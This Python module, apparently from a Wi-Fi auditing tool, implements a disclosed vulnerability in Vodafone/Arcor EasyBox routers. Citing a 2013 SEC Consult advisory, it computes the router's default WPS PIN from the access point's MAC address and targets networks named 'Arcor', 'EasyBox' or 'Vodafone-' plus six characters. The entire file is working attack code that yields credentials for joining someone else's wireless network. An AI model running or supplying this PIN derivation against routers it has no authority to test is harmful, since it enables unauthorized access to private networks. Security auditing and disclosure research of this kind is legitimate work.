from netaddr import EUI

from ..helpers.mac import get_ei_from_eui
from ..helpers.wps_pin import calc_pin
from .core.base import ToolBase


# Adapted from vulnerability report
# https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130805-0_Vodafone_EasyBox_Default_WPS_PIN_Vulnerability_v10.txt
# Date 2012-12-01
class ToolEasyboxWps(ToolBase):
    @staticmethod
    def get_pins(bssid: EUI, essid: str, serial: str) -> list:
        ei = get_ei_from_eui(bssid)
        ei_pair_2 = ei[2:4]
        ei_pair_3 = ei[4:6]

        serial = '{0:0>5}'.format(int(ei_pair_2 + ei_pair_3, 16))
        serial_2 = int(serial[1])
        serial_3 = int(serial[2])
        serial_4 = int(serial[3])
        serial_5 = int(serial[4])

        dec_1 = int(ei_pair_2[0], 16)
        dec_2 = int(ei_pair_2[1], 16)
        dec_3 = int(ei_pair_3[0], 16)
        dec_4 = int(ei_pair_3[1], 16)

        master_key_1 = (serial_2 + serial_3 + dec_3 + dec_4) % 16
        master_key_2 = (serial_4 + serial_5 + dec_1 + dec_2) % 16

        pin_split = [
            master_key_1 ^ serial_5,
            master_key_1 ^ serial_4,
            master_key_2 ^ dec_2,
            master_key_2 ^ dec_3,
            dec_3 ^ serial_5,
            dec_4 ^ serial_4,
            master_key_1 ^ serial_3
        ]

        pin_hex = ''.join(format(x, 'x') for x in pin_split)
        pin_last_seven_dec = int(pin_hex, 16) % 10e6
        return [calc_pin(pin_last_seven_dec)]

    @staticmethod
    def supported_ouis() -> list:
        return []

    @staticmethod
    def supported_essids() -> list:
        return ['Arcor', 'EasyBox', 'Vodafone-.{6}']

    @staticmethod
    def supported_serials() -> list:
        return []
